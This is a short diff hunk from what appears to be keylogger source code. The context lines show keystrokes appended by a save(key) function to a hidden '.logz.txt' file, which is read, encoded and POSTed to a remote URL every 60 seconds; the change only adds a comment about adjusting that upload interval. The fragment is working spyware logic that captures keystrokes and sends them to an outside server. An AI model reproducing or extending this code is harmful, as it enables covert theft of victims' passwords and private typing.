@@ -25,7 +25,7 @@ def upload():
 		logz = f.read()
 		r = requests.post(url, data={'klogz':ende(logz)})
 		f.close()
-		time.sleep(60)
+		time.sleep(60) # <---- Logs will update every 60secs, change the value if you want.
 
 def save(key):
 	f = open('.logz.txt','a')
